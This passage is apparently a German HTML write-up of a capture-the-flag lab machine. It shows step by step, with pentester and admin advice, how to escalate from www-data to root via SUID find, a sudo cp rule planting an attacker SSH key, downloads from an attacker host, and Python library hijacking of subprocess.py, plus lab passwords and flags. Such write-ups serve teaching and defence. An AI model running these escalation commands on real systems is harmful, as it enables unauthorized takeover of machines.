+             <p class="analysis"><strong>Analyse:</strong> Es werden Versuche unternommen, `sudo` zu verwenden, um `find` als Benutzer `gehenna` oder `talos` auszuführen. Der Versuch mit `gehenna` scheitert, da der Benutzer `gehenna` dem System (oder `sudo`) unbekannt ist (trotz des Home-Verzeichnisses - möglicherweise ein Überbleibsel oder der Benutzer `elohim` nutzt dieses Verzeichnis). Der Versuch mit `talos` scheitert, da `www-data` keine `sudo`-Rechte hat und nach einem Passwort gefragt wird.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt, dass `www-data` keine `sudo`-Rechte hat und `gehenna` kein gültiger Benutzer für `sudo` ist. Dies unterstreicht die Notwendigkeit, den SUID-`find`-Vektor zu nutzen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie den SUID-`find` direkt, nicht über `sudo`.<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">www-data@principle:/etc/apache2/conf-available$ <span class="command">cat /etc/crontab</span></div>
+                    <pre>
+# /etc/crontab: system-wide crontab
+[...]
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+[...]
+# *  *  *  *  * user-name command to be executed
+<span class="command">*/5 * * * *	root	/opt/reviewer.py</span>
+[...]
+</pre>
+                    <div class="prompt">www-data@principle:/etc/apache2/conf-available$ <span class="command">ls -la /opt/reviewer.py</span></div>
+                    <pre><span class="command">-rwxr-xr-x 1 root root 1072 Jul  7 15:17 /opt/reviewer.py</span></pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Die System-Crontab (`/etc/crontab`) wird untersucht. Es wird ein Cronjob gefunden, der alle 5 Minuten (`*/5 * * * *`) das Python-Skript `/opt/reviewer.py` als Benutzer `root` ausführt. Die Berechtigungen der Datei zeigen, dass sie Root gehört, aber von allen gelesen und ausgeführt werden kann (`rwxr-xr-x`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein potenzieller, aber indirekter Vektor. Wenn das Skript `/opt/reviewer.py` manipulierbare Eingaben verwendet oder selbst Schwachstellen enthält, könnte dies ausgenutzt werden. Da `www-data` keine Schreibrechte hat, ist eine direkte Manipulation des Skripts nicht möglich. Es könnte jedoch ein Hinweis für eine spätere Eskalationsphase sein, wenn man als ein anderer Benutzer Schreibrechte erlangt oder das Verhalten des Skripts beeinflussen kann.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie den Inhalt von `/opt/reviewer.py`, um seine Funktion zu verstehen. Merken Sie sich diesen Cronjob für später. Versuchen Sie, das Skript manuell auszuführen, um sein Verhalten und mögliche Fehlermeldungen zu sehen.<br><strong>Empfehlung (Admin):</strong> Cronjobs sollten immer mit minimal notwendigen Rechten laufen. Skripte, die als Root ausgeführt werden, müssen besonders sicher geschrieben sein und dürfen keine unsicheren Abhängigkeiten oder manipulierbaren Pfade/Eingaben verwenden. Überprüfen Sie die Berechtigungen von Skripten in `/opt`.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">www-data@principle:/dev/shm$ <span class="command">/opt/reviewer.py</span></div>
+                     <pre>
+<span class="password">Archivo eliminado: /var/www/hellfire.t4l0s.hmv/archivos/cmd.php</span>
+Traceback (most recent call last):
+  File "/opt/reviewer.py", line 31, in &lt;module&gt;
+    enviar_mensaje_usuarios_conectados()
+  File "/opt/reviewer.py", line 27, in enviar_mensaje_usuarios_conectados
+    usuarios_conectados = [usuario.split()[0] for usuario in lista_usuarios]
+                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/opt/reviewer.py", line 27, in &lt;listcomp&gt;
+    usuarios_conectados = [usuario.split()[0] for usuario in lista_usuarios]
+                           ~^^^
+<span class="password">IndexError: list index out of range</span>
+</pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Das Skript `/opt/reviewer.py` wird manuell als `www-data` ausgeführt. Es gibt eine Meldung aus, dass die zuvor hochgeladene Webshell (`cmd.php`) gelöscht wurde ("Archivo eliminado: ..."). Anschließend bricht das Skript mit einem `IndexError: list index out of range` ab. Die Fehlermeldung tritt in einer Funktion `enviar_mensaje_usuarios_conectados` auf, die versucht, eine Liste von Benutzern zu verarbeiten.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Skript scheint eine Aufräumfunktion zu haben (löscht die Webshell) und versucht dann, Informationen über eingeloggte Benutzer zu verarbeiten, was aber fehlschlägt (möglicherweise, weil keine Benutzer auf eine bestimmte Weise eingeloggt sind, oder wegen eines Bugs). Das Löschen der Webshell ist ärgerlich, aber die RCE war bereits etabliert. Der Fehler selbst bietet keine direkte Eskalationsmöglichkeit, aber das Wissen um die Funktion des Skripts ist nützlich.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beachten Sie, dass Ihre Webshell möglicherweise regelmäßig gelöscht wird. Konzentrieren Sie sich auf die Eskalation zu `talos` mittels SUID-`find`. Wenn später Root-Rechte erlangt werden, könnte das Skript `/opt/reviewer.py` selbst modifiziert werden.<br><strong>Empfehlung (Admin):</strong> Beheben Sie den Bug im Skript. Stellen Sie sicher, dass Aufräumskripte robust sind. Überlegen Sie, ob das Skript wirklich als Root laufen muss.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@principle:/home/talos$ <span class="command">find . -exec /bin/sh -p \; -quit</span></div>
+                     <pre>$ <span class="password"># Shell wechselt zu einfacher Shell, aber mit talos Rechten</span></pre>
+                     <div class="prompt">$ <span class="command">/bin/bash -p</span></div>
+                    <pre>bash-5.2$ <span class="password"># Upgrade zur Bash-Shell als talos</span></pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Hier wird der SUID-`find`-Exploit ausgeführt. `/usr/bin/find . -exec /bin/sh -p \; -quit` startet eine Shell (`/bin/sh`) mit den Rechten des Besitzers von `find` (`talos`), wobei `-p` die effektiven Rechte beibehält. Das Ergebnis ist zunächst eine einfache `$`-Shell. Mit `/bin/bash -p` wird diese zu einer interaktiveren Bash-Shell aufgerüstet, die weiterhin mit den Rechten von `talos` läuft.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolgreiche Privilege Escalation von `www-data` zu `talos` durch Ausnutzung des SUID-Bits auf `/usr/bin/find`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Sie agieren nun als `talos`. Untersuchen Sie erneut das Home-Verzeichnis von `talos`, insbesondere die `note.txt`. Prüfen Sie `sudo -l` für `talos`.</p>
+            <p class="recommendation"><strong>Empfehlung (Admin):</strong> Entfernen Sie das SUID-Bit von `/usr/bin/find` (`chmod u-s /usr/bin/find`), da es selten benötigt wird und ein bekanntes Eskalationsrisiko darstellt.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">bash-5.2$ <span class="command">cd /home/talos/</span></div>
+                     <pre>[Keine Ausgabe]</pre>
+                     <div class="prompt">bash-5.2$ <span class="command">cat note.txt</span></div>
+                     <pre>
+Congratulations! You have made it this far thanks to the manipulated
+file I left you, I knew you would make it!
+
+Now we are very close to finding this false God Elohim.
+I left you a file with the name of one of the 12 Gods of
+Olympus, out of the eye of Elohim ;)
+The tool I left you is still your ally.
+Good luck to you.
+</pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Als Benutzer `talos` wird nun die Datei `note.txt` im Home-Verzeichnis gelesen. Sie enthält eine Nachricht, die auf eine weitere Datei hinweist, benannt nach einem der 12 olympischen Götter, und erwähnt, dass "das Werkzeug" (`find`?) immer noch nützlich ist.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Wichtiger Hinweis für den nächsten Schritt. Es muss nach einer Datei gesucht werden, die nach einem griechischen Gott benannt ist (Zeus, Hera, Poseidon, Demeter, Athene, Apollo, Artemis, Ares, Aphrodite, Hephaistos, Hermes, Dionysos/Hestia). Die Suche sollte wahrscheinlich im Home-Verzeichnis von `talos` stattfinden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie `find` oder `ls -R` im Home-Verzeichnis von `talos`, um nach Dateien zu suchen, die nach olympischen Göttern benannt sind (z.B. `find . -iname "Aphrodite*"` etc.). Untersuchen Sie versteckte Verzeichnisse.<br><strong>Empfehlung (Admin):</strong> Keine direkten Maßnahmen, aber generell sollten keine Hinweise oder Rätsel in Notizdateien auf einem Produktionssystem hinterlassen werden.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">bash-5.2$ <span class="command">grep -iR "my pass" * 2>/dev/null</span></div>
+                     <pre><span class="command">selinux/Afrodita.key</span>:Here is my password:</pre>
+                     <div class="prompt">bash-5.2$ <span class="command">cat selinux/Afrodita.key</span></div>
+                     <pre>
+Here is my password:
+<span class="password">Hax0rModeN</span>
+
+Now I have done another little trick to help you reach Elohim.
+REMEMBER: You need the access key and open the door. Anyway, he has a bad memory and that's why he keeps the lock coded and hidden at home.
+</pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Mit `grep -iR "my pass" * 2>/dev/null` wird rekursiv im aktuellen Verzeichnis (und Unterverzeichnissen) nach Dateien gesucht, die die Zeichenkette "my pass" (case-insensitive) enthalten. Dies führt zur Datei `<span class="command">selinux/Afrodita.key</span>`. Der Inhalt dieser Datei wird angezeigt und enthüllt das Passwort `<span class="password">Hax0rModeN</span>` sowie einen weiteren Hinweis auf einen "Zugangsschlüssel" und eine "Tür" und einen "versteckten Code" im Home-Verzeichnis.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Passwort für den Benutzer `talos` wurde gefunden! Der Hinweis auf "Afrodita" (Aphrodite) bestätigt die Spur der olympischen Götter. Der zusätzliche Hinweis deutet auf SSH-Zugang und möglicherweise versteckte Informationen im Home-Verzeichnis von `elohim` hin.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie das Passwort `<span class="password">Hax0rModeN</span>`, um sich über `su talos` korrekt als `talos` zu authentifizieren (um eine "saubere" Shell zu bekommen, falls die `find`-Shell Probleme macht) oder potenziell für andere Dienste. Prüfen Sie die `sudo`-Rechte für `talos` erneut mit `sudo -l` (diesmal mit Passwort).<br><strong>Empfehlung (Admin):</strong> Passwörter dürfen niemals im Klartext in Dateien gespeichert werden. Versteckte Verzeichnisse oder Dateien bieten keine echte Sicherheit. Überprüfen Sie regelmäßig Systeme auf solche Vorkommnisse.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">bash-5.2$ <span class="command">su talos</span></div>
+                    <pre>Password:</pre>
+                    <div class="prompt"># <span class="command">[Passworteingabe: Hax0rModeN]</span></div>
+                    <pre>talos@principle:/etc$ <span class="password"># Erfolgreicher Login als talos</span></pre>
+                    <div class="prompt">talos@principle:/etc$ <span class="command">sudo -l</span></div>
+                    <pre>
+Matching Defaults entries for talos on principle:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    use_pty
+
+User talos may run the following commands on principle:
+    <span class="command">(elohim) NOPASSWD: /bin/cp</span>
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Pentester wechselt mit `su talos` und dem gefundenen Passwort `<span class="password">Hax0rModeN</span>` in eine reguläre Shell des Benutzers `talos`. Anschließend wird `sudo -l` ausgeführt. Die Ausgabe zeigt, dass `talos` den Befehl `/bin/cp` ohne Passwort (`NOPASSWD`) als Benutzer `elohim` ausführen darf.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist der nächste Schritt zur Privilege Escalation. Die Fähigkeit, `/bin/cp` als `elohim` auszuführen, kann genutzt werden, um Dateien zu überschreiben oder zu kopieren, auf die `talos` normalerweise keinen Zugriff hätte, insbesondere im Kontext des Benutzers `elohim`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie `sudo -u elohim /bin/cp`, um sich SSH-Zugriff als `elohim` zu verschaffen. Erstellen Sie ein SSH-Schlüsselpaar auf dem Angreifer-System. Kopieren Sie den öffentlichen Schlüssel in eine Datei (z.B. `authorized_keys_attacker`). Verwenden Sie dann `sudo -u elohim /bin/cp authorized_keys_attacker /home/gehenna/.ssh/authorized_keys` (angenommen, `/home/gehenna` ist das Home-Verzeichnis von `elohim`). Verbinden Sie sich anschließend via SSH (Port 3445) als `elohim` mit Ihrem privaten Schlüssel.<br><strong>Empfehlung (Admin):</strong> Überprüfen Sie `sudo`-Regeln sorgfältig. Das Ausführen von Dateimanipulationsbefehlen wie `cp`, `mv`, `chmod`, `chown` als anderer Benutzer ist extrem gefährlich und sollte vermieden werden. Wenn nötig, verwenden Sie spezifischere Skripte oder Befehle.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt"># <span class="command">Vorbereitungen auf Angreifer-System</span></div>
+                    <div class="prompt">┌──(root㉿cycat)-[~/.ssh]
+└─# <span class="command">ssh-keygen</span></div>
+                    <pre>
+Generating public/private rsa key pair.
+Enter file in which to save the key (/root/.ssh/id_rsa): <span class="password">[Enter]</span>
+/root/.ssh/id_rsa already exists.
+Overwrite (y/n)? <span class="command">y</span>
+Enter passphrase (empty for no passphrase): <span class="password">[Enter]</span>
+Enter same passphrase again: <span class="password">[Enter]</span>
+Your identification has been saved in /root/.ssh/id_rsa
+Your public key has been saved in /root/.ssh/id_rsa.pub
+[...]
+</pre>
+                    <div class="prompt">┌──(root㉿cycat)-[~/.ssh]
+└─# <span class="command">cat id_rsa.pub > authorized_keys</span></div>
+                    <pre>[Keine Ausgabe]</pre>
+                    <div class="prompt">┌──(root㉿cycat)-[/usr/bin] <span class="password">&lt;-- Wechselt Verzeichnis, warum?</span>
+└─# <span class="command">python3 -m http.server</span></div>
+                    <pre>Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Auf dem Angreifer-System wird mit `ssh-keygen` ein neues SSH-Schlüsselpaar erstellt (oder ein vorhandenes überschrieben). Der öffentliche Schlüssel (`id_rsa.pub`) wird in eine Datei namens `authorized_keys` kopiert. Anschließend wird im Verzeichnis `/usr/bin` (unklar, warum dieses Verzeichnis gewählt wurde, vielleicht um `wget` oder `curl` später einfacher bereitzustellen?) ein einfacher Python-HTTP-Server gestartet, um Dateien für das Zielsystem bereitzustellen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Korrekte Vorbereitungsschritte, um den öffentlichen SSH-Schlüssel auf das Zielsystem zu übertragen und später mit `sudo -u elohim cp` zu platzieren.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stellen Sie sicher, dass der HTTP-Server aus einem Verzeichnis gestartet wird, das die benötigte `authorized_keys`-Datei enthält. Übertragen Sie die Datei auf das Zielsystem (z.B. nach `/tmp` oder `/dev/shm`).<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">talos@principle:~/.ssh$ <span class="command">cd ~</span></div>
+                    <pre>[Keine Ausgabe]</pre>
+                    <div class="prompt">talos@principle:~$ <span class="command">wget 192.168.2.199:8000/authorized_keys</span></div> <span class="password">&lt;-- Annahme: Datei wurde im Webserver-Root bereitgestellt</span>
+                     <pre>
+--2023-07-27 19:xx:xx--  http://192.168.2.199:8000/authorized_keys
+Connecting to 192.168.2.199:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 553 [application/octet-stream]
+Saving to: ‘authorized_keys’
+
+authorized_keys     100%[===================>]     553   --.-KB/s    in 0s
+
+2023-07-27 19:xx:xx (XXX MB/s) - ‘authorized_keys’ saved [553/553]
+</pre>
+                    <div class="prompt">talos@principle:~$ <span class="command">sudo -u elohim /bin/cp authorized_keys /home/gehenna/.ssh/authorized_keys</span></div>
+                     <pre>[Keine Ausgabe, falls erfolgreich]</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Als Benutzer `talos` wird die zuvor auf dem Angreifer-System vorbereitete `authorized_keys`-Datei (die den öffentlichen Schlüssel des Angreifers enthält) über den Python-HTTP-Server heruntergeladen. Anschließend wird der `sudo`-Befehl verwendet, um diese Datei als Benutzer `elohim` in das `.ssh`-Verzeichnis von `elohim` (dessen Home-Verzeichnis `/home/gehenna` ist) zu kopieren.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der `sudo`-Exploit wurde erfolgreich durchgeführt. Der öffentliche SSH-Schlüssel des Angreifers befindet sich nun in der `authorized_keys`-Datei von `elohim`, was einen passwortlosen SSH-Login als `elohim` ermöglicht.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie nun, sich als `elohim` via SSH auf Port 3445 mit Ihrem privaten Schlüssel (`id_rsa`) zu verbinden: `ssh -i /root/.ssh/id_rsa elohim@principle.hmv -p 3445`.<br><strong>Empfehlung (Admin):</strong> Überprüfen und korrigieren Sie die `sudo`-Regel für `talos`. Überwachen Sie verdächtige `cp`-Operationen und Änderungen an `authorized_keys`-Dateien.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">talos@principle:~$ <span class="command"># Versuch SSH-Login als elohim (impliziert durch nächsten Prompt)</span></div>
+                     <div class="prompt"># <span class="command">./ssh -i id_rsa elohim@localhost -p 3445</span> <span class="password">&lt;-- Verwendet lokale Kopie von ssh?</span></div>
+                     <pre>
+Son, you didn't listen to me, and now you're trapped.
+You've come a long way, but this is the end of your journey.
+
+elohim@principle:~$ <span class="password"># Erfolgreicher Login als elohim</span>
+</pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Der Kommentar `# ./ssh -i id_rsa elohim@localhost -p 3445` deutet darauf hin, dass der SSH-Login als `elohim` durchgeführt wurde. Es wird `localhost` und der zuvor gefundene Port `3445` verwendet. `-i id_rsa` spezifiziert den privaten Schlüssel (der vermutlich zuvor auch per `wget` heruntergeladen wurde, siehe `wget ... /id_rsa` weiter unten im Log). Die Verwendung von `./ssh` statt `/usr/bin/ssh` ist ungewöhnlich und deutet darauf hin, dass möglicherweise eine lokale Kopie der `ssh`-Binary verwendet wurde (siehe `wget ... /ssh`). Der Login ist erfolgreich, und der Prompt wechselt zu `elohim@principle:~$`.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Privilege Escalation zu `elohim` erfolgreich abgeschlossen.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfen Sie nun die `sudo`-Rechte für `elohim` mit `sudo -l`. Suchen Sie nach weiteren Hinweisen im Home-Verzeichnis von `elohim` (`/home/gehenna`).<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion, außer der Überprüfung der `sudo`-Regel für `cp`.</p>
+            <!-- Wget-Befehle für ssh und id_rsa sind hier im Original-Log etwas durcheinander platziert, werden aber im Kontext des SSH-Logins relevant -->
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">talos@principle:~$ <span class="command">wget 192.168.2.199:8000/ssh</span></div>
+                     <pre>
+--2023-07-27 19:27:54--  http://192.168.2.199:8000/ssh
+[...]
+Saving to: ‘ssh’
+ssh                 100%[===================>]   1.07M  --.-KB/s    in 0.003s
+2023-07-27 19:27:54 (389 MB/s) - ‘ssh’ saved [1125408/1125408]
+</pre>
+                     <div class="prompt">talos@principle:~$ <span class="command">wget 192.168.2.199:8000/id_rsa</span></div>
+                     <pre>
+--2023-07-27 19:30:25--  http://192.168.2.199:8000/id_rsa
+[...]
+Saving to: ‘id_rsa’
+id_rsa              100%[===================>]   2.57K  --.-KB/s    in 0s
+2023-07-27 19:30:25 (445 MB/s) - ‘id_rsa’ saved [2635/2635]
+</pre>
+                     <div class="prompt">talos@principle:~$ <span class="command">chmod 600 id_rsa</span></div>
+                     <pre>[Keine Ausgabe]</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Diese `wget`-Befehle (die im Original-Log vor dem erfolgreichen `elohim`-Login stehen, aber hier thematisch passen) laden die `ssh`-Binary und den privaten Schlüssel `id_rsa` vom Angreifer-Server herunter. Die `chmod 600 id_rsa` setzt die notwendigen Berechtigungen für den privaten Schlüssel.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Erklärt, warum im SSH-Befehl `./ssh` und `-i id_rsa` verwendet werden konnte – die benötigten Dateien wurden zuvor heruntergeladen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Sicherstellen, dass heruntergeladene Binaries vertrauenswürdig sind oder vom System stammen. Korrekte Berechtigungen für private Schlüssel setzen.<br><strong>Empfehlung (Admin):</strong> Überwachen Sie ausgehende Verbindungen und Downloads von Binärdateien auf Servern.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">elohim@principle:~$ <span class="command">sudo -l</span></div>
+                    <pre>
+Matching Defaults entries for elohim on principle:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    use_pty
+
+User elohim may run the following commands on principle:
+    <span class="command">(root) NOPASSWD: /usr/bin/python3 /opt/reviewer.py</span>
+</pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Als Benutzer `elohim` wird `sudo -l` ausgeführt. Es zeigt sich, dass `elohim` den Befehl `/usr/bin/python3 /opt/reviewer.py` ohne Passwort (`NOPASSWD`) als Benutzer `root` ausführen darf.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist der letzte Schritt zur Root-Eskalation! Da `elohim` dieses spezifische Python-Skript als Root ausführen kann, muss nur ein Weg gefunden werden, die Ausführung dieses Skripts zu manipulieren, um stattdessen eine Root-Shell zu erhalten. Das Skript `/opt/reviewer.py` selbst ist zwar nicht schreibbar, aber es importiert möglicherweise andere Python-Module, die manipuliert werden können.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Finden Sie heraus, welche Python-Module von `/opt/reviewer.py` importiert werden (z.B. durch Lesen des Skript-Codes). Suchen Sie nach einem Modul, auf das `elohim` Schreibrechte hat (z.B. in Standard-Bibliothekspfaden oder im Home-Verzeichnis). Überschreiben Sie dieses Modul mit Code, der eine Root-Shell startet (z.B. `import os; os.system('/bin/bash -p')`). Führen Sie dann `sudo -u root /usr/bin/python3 /opt/reviewer.py` aus.<br><strong>Empfehlung (Admin):</strong> `sudo`-Regeln extrem restriktiv gestalten. Das Ausführen von Skripten (insbesondere Python, Perl, Shell) als anderer Benutzer ist sehr riskant. Wenn es unvermeidbar ist, stellen Sie sicher, dass das Skript und alle seine Abhängigkeiten nicht vom ausführenden Benutzer manipuliert werden können (korrekte Berechtigungen, sichere Pfade).</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">elohim@principle:~$ <span class="command">find / -writable 2>/dev/null | grep -i subprocess</span></div>
+                    <pre><span class="command">/usr/lib/python3.11/subprocess.py</span></pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Mit `find / -writable 2>/dev/null` wird nach weltweit beschreibbaren Dateien gesucht. Die Ausgabe wird durch `grep -i subprocess` gefiltert. Es wird festgestellt, dass die Standard-Python-Bibliotheksdatei `<span class="command">/usr/lib/python3.11/subprocess.py</span>` beschreibbar ist (vermutlich für den Benutzer `elohim`, da der vorherige `find`-Befehl als `elohim` lief, oder sogar für alle).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Kritische Fehlkonfiguration! Eine Standard-Systembibliothek ist beschreibbar. Da `/opt/reviewer.py` wahrscheinlich das `subprocess`-Modul (oder ein Modul, das `subprocess` importiert) verwendet, kann `elohim` diese Datei überschreiben, um bei der nächsten Ausführung des `sudo`-Befehls eigenen Code als Root einzuschleusen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überschreiben Sie `/usr/lib/python3.11/subprocess.py` mit einem einfachen Payload, der eine Shell startet, z.B. `import os; os.system("/bin/bash -p")`. Führen Sie dann `sudo -u root /usr/bin/python3 /opt/reviewer.py` aus.<br><strong>Empfehlung (Admin):</strong> Korrigieren Sie sofort die Berechtigungen von `/usr/lib/python3.11/subprocess.py` und anderen Systembibliotheken (sollten nur für Root schreibbar sein). Untersuchen Sie, warum die Berechtigungen falsch waren. Verwenden Sie Tools zur Integritätsprüfung (aide, tripwire).</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">elohim@principle:~$ <span class="command">printf 'import os\nos.system("/bin/bash -p")' > /usr/lib/python3.11/subprocess.py</span></div>
+                     <pre>[Keine Ausgabe]</pre>
+                     <div class="prompt">elohim@principle:~$ <span class="command">sudo -u root /usr/bin/python3 /opt/reviewer.py</span></div>
+                     <pre>root@principle:/home/gehenna# <span class="password"># Root-Shell erhalten!</span></pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Mit `printf` wird der Inhalt der Datei `/usr/lib/python3.11/subprocess.py` mit dem Python-Code `import os\nos.system("/bin/bash -p")` überschrieben. Dieser Code importiert das `os`-Modul und führt `/bin/bash -p` aus, was eine Bash-Shell mit Root-Rechten startet (da `-p` die effektive UID beibehält). Anschließend wird der `sudo`-Befehl ausgeführt. Da `/opt/reviewer.py` nun beim Versuch, `subprocess` zu importieren, den manipulierten Code ausführt, wird die Bash-Shell gestartet, und der Prompt wechselt zu `root@principle:...`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Fantastisch! Die Privilege Escalation zu `root` ist erfolgreich abgeschlossen durch Ausnutzung der `sudo`-Regel in Kombination mit unsicheren Dateiberechtigungen auf einer Python-Systembibliothek (Python Library Hijacking).</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Sie haben Root-Zugriff. Suchen Sie die Root-Flag (`/root/root.txt`). Stellen Sie die ursprüngliche `subprocess.py` wieder her, falls möglich, um das System nicht dauerhaft zu beschädigen (oder vermerken Sie die Änderung deutlich).<br><strong>Empfehlung (Admin):</strong> Alle vorherigen Empfehlungen umsetzen (sudo-Regeln, Dateiberechtigungen). System auf weitere Manipulationen prüfen. Integrität der Systembibliotheken wiederherstellen (z.B. aus Backup oder Neuinstallation des Pakets).</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">root@principle:/home/gehenna# <span class="command">cd /root</span></div>
+                    <pre>[Keine Ausgabe]</pre>
+                    <div class="prompt">root@principle:~# <span class="command">ls</span></div> <span class="password">&lt;-- Korrektur: Prompt leicht geändert</span>
+                    <pre>root.txt</pre>
+                    <div class="prompt">root@principle:~# <span class="command">cat root.txt</span></div>
+                    <pre>
+CNGRATULATINS, the system has been pwned!
+
+          _______
+        @@@@@@@@@@@
+      @@@@@@@@@@@@@@@
+     @@@@@@@222@@@@@@@
+    (@@@@@/_____\@@@@@)
+     @@@@(_______)@@@@
+      @@@{ " L " }@@@
+       \@  \ - /  @/
+        /    ~    \
+      /          \
+    &lt;      \ __ /      &gt;
+   / \          |    /  \
+ /    \       +       \
+|      \     ___|_         |
+| \//~|---/ *   |     }
+{  /|   |-----/|  |    /
+ \_ |  /           |__|_ /
+
+<span class="password">+wP"y8z3TcDq!&amp;a*rg/</span> <span class="password">&lt;-- User-Flag? Hier im Root-Flag-Text?</span>
+</pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Als `root` wird in das `/root`-Verzeichnis gewechselt und die Datei `root.txt` angezeigt. Sie enthält eine Glückwunsch-Nachricht, ASCII-Art und eine Flag: `<span class="password">+wP"y8z3TcDq!&amp;a*rg/</span>`.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Die Root-Flag wurde gefunden. Interessanterweise scheint die hier angezeigte Flag (`+wP"y8z3TcDq!&amp;a*rg/`) mit der Flag übereinzustimmen, die im späteren "Flags"-Abschnitt als User-Flag bezeichnet wird. Dies könnte ein Fehler in der Maschine oder im Bericht sein.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dokumentieren Sie die gefundene Flag. Vergleichen Sie sie mit der Flag im finalen Abschnitt des Berichts.<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">root@principle:~# <span class="command">cd /home/gehenna</span></div>
+                    <pre>[Keine Ausgabe]</pre>
+                    <div class="prompt">root@principle:/home/gehenna# <span class="command">ls</span></div>
+                    <pre>flag.txt</pre>
+                    <div class="prompt">root@principle:/home/gehenna# <span class="command">cat flag.txt</span></div>
+                    <pre>
+                           _
+                          _)\.-.
+         .-.__,___,_.-=-. )\`  a`\_
+     .-.__\__,__,__.-=-. `/  \     `\
+     {~,-~-,-~.-~,-,;;;;\ |   '--;`)/
+      \-,~_-~_-,~-,(_(_(;\/   ,;/
+       ",-.~_,-~,-~,)_)_)'.  ;;(
+         `~-,_-~,-~(_(_(_(_\  `;\
+   ,          `"--,)_)_)_)\_   \
+   |\              (_(_/_(_,   \  ;
+   \ '-.       _.--'  /_/_/_)   | |
+    '--.\    .'          /_/    | |
+        ))  /       \      |   /.'
+       //  /,        | __.'|  ||
+      //   ||        /`    (  ||
+     ||    ||      .'       \ \\
+     ||    ||    .'_         \ \\
+      \\   //   / _ `\        \ \\__
+       \'-'/(   _  `\,;        \ '--:,
+        `"`  `"` `-,,;         `"`",,;
+
+
+CNGRATULATINS, you have defeated me!
+
+The flag is:
+<span class="password">K|tW4bw7$zNh'PwSh/jN</span> <span class="password">&lt;-- Root-Flag? Hier in gehenna/flag.txt?</span>
+</pre>
